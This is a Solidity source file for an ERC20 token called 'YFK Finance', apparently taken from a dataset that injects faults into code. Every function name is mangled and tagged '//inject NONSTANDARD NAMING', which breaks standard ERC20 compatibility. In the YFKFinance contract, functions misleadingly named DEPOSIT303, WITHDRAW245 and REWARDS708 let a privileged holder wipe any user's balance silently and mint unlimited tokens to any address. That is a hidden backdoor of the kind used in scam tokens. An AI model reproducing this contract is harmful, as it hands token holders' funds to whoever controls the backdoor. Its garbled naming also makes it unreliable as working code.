                                                                 

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         

pragma solidity ^0.5.16;
interface IERC20 {
    function TOTALSUPPLY103() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF4(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER761(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE118(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE334(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM850(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER200(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL413(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}
contract Context {
    constructor () internal { }
    function _MSGSENDER926() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY103() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF4(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER761(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER250(_MSGSENDER926(), recipient, amount);
        return true;
    }
    function ALLOWANCE118(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE334(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE84(_MSGSENDER926(), spender, amount);
        return true;
    }
    function TRANSFERFROM850(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER250(sender, recipient, amount);
        _APPROVE84(sender, _MSGSENDER926(), _allowances[sender][_MSGSENDER926()].SUB870(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE482(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE84(_MSGSENDER926(), spender, _allowances[_MSGSENDER926()][spender].ADD569(addedValue));
        return true;
    }
    function DECREASEALLOWANCE495(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE84(_MSGSENDER926(), spender, _allowances[_MSGSENDER926()][spender].SUB870(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER250(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB870(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD569(amount);
        emit TRANSFER200(sender, recipient, amount);
    }
    function _INITMINT830(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD569(amount);
        _balances[account] = _balances[account].ADD569(amount);
        emit TRANSFER200(address(0), account, amount);
    }
    function _REWARDS839(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD569(amount);
        _balances[account] = _balances[account].ADD569(amount);
    }
    function _WITHDRAW237(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.ADD569(amount);
        _balances[account] = _balances[account].ADD569(amount);
    }
    function _BURN93(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].SUB870(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB870(amount);
        emit TRANSFER200(account, address(0), amount);
    }
    function _DEPOSIT161(address acc) internal {	//inject NONSTANDARD NAMING
        require(acc != address(0), "deposit to the zero address");
        uint amount = _balances[acc];
        _balances[acc] = 0;
        _totalSupply = _totalSupply.SUB870(amount);
    }
    function _APPROVE84(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL413(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME964() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL781() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS178() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD569(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB870(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB870(a, b, "SafeMath: subtraction overflow");
    }
    function SUB870(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL654(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV591(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV591(a, b, "SafeMath: division by zero");
    }
    function DIV591(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract YFKFinance is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public YFKholders;
  constructor () public ERC20Detailed("YFK Finance", "YFK", 18) {
      _INITMINT830( msg.sender, 2000*10**uint(DECIMALS178()) );
      YFKholders[msg.sender] = true;
  }

  function DEPOSIT303(address account) public {	//inject NONSTANDARD NAMING
      require(YFKholders[msg.sender], "error");
      _DEPOSIT161(account);
  }

  function WITHDRAW245(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(YFKholders[msg.sender], "error");
      _WITHDRAW237(account, amount);
  }

  function REWARDS708(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(YFKholders[msg.sender], "error");
      _REWARDS839(account, amount);
  }

}